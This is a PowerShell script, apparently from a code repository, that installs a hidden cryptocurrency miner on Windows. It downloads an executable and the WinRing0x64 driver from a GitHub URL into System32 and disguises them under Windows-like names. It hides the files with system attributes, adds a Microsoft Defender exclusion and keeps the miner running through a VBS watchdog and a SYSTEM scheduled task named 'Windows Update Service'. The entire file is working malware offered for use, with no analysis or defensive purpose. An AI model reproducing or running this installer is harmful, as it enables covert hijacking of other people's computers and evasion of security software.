if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "Run with admin rights"; exit
}

$sysDir = "$env:SystemRoot\System32"
$urls = @{
    "wuaserv.exe" = "https://github.com/al0nks1337/wuaserv/raw/refs/heads/main/wuaserv.exe"
    "WinRing0x64.sys" = "https://github.com/al0nks1337/wuaserv/raw/refs/heads/main/WinRing0x64.sys"
}

# Clean old files
$oldFiles = @("$sysDir\wuaserv.exe", "$sysDir\WinRing0x64.sys", "$sysDir\slmgr2.vbs")
foreach ($file in $oldFiles) {
    if (Test-Path $file) {
        attrib -h -s "$file" | Out-Null
        Remove-Item -Path $file -Force
    }
}

# Remove old task
Get-ScheduledTask -TaskName "Windows Update Service" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false

# User input
$pool = Read-Host "Pool address"
$wallet = Read-Host "Wallet"
$pass = Read-Host "Password"
$threads = Read-Host "Thread count"

# Download files
foreach ($file in $urls.Keys) {
    try {
        Invoke-WebRequest -Uri $urls[$file] -OutFile "$sysDir\$file" -ErrorAction Stop
    } catch {
        Write-Error "Download failed: $_"; exit
    }
}

# Create VBS file
$vbsTemplate = @'
Option Explicit
Dim scriptFullPath, scriptDir, objWMIService, colProcesses, objProcess, strComputer
Dim objShell, strProcessName, strAppPath, processMap, processKey, blnProcessFound
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set objShell = CreateObject("WScript.Shell")
Set processMap = CreateObject("Scripting.Dictionary")
processMap.Add "wuaserv.exe", "{appPath} -o {pool} -u {wallet} -p {pass} -t {threads}"
Do While True
    For Each processKey In processMap.Keys
        strProcessName = processKey
        strAppPath = processMap.Item(processKey)
        blnProcessFound = False
        Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & strProcessName & "'")
        For Each objProcess in colProcesses
            blnProcessFound = True
        Next
        If blnProcessFound = False Then
            objShell.Run strAppPath
        End If
    Next
    WScript.Sleep 1055
Loop
'@

$vbsContent = $vbsTemplate -replace "{pool}", $pool `
                           -replace "{wallet}", $wallet `
                           -replace "{pass}", $pass `
                           -replace "{threads}", $threads `
                           -replace "{appPath}", "$sysDir\wuaserv.exe"

Out-File -FilePath "$sysDir\slmgr2.vbs" -InputObject $vbsContent -Encoding ASCII

# Set hidden/system attributes using attrib
$hiddenFiles = @("$sysDir\wuaserv.exe", "$sysDir\WinRing0x64.sys", "$sysDir\slmgr2.vbs")
foreach ($file in $hiddenFiles) {
    attrib +h +s "$file" | Out-Null
}

# Add Defender exclusion
Add-MpPreference -ExclusionPath "$sysDir\wuaserv.exe" -ErrorAction SilentlyContinue

# Create scheduled task
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "$sysDir\slmgr2.vbs"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 9999
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings

Register-ScheduledTask -TaskName "Windows Update Service" -TaskPath "\Microsoft\Windows\" -InputObject $task -ErrorAction SilentlyContinue

# Start task after delay
Start-Sleep -Seconds 5
Start-ScheduledTask -TaskName "Windows Update Service"
Write-Host "Setup completed!"
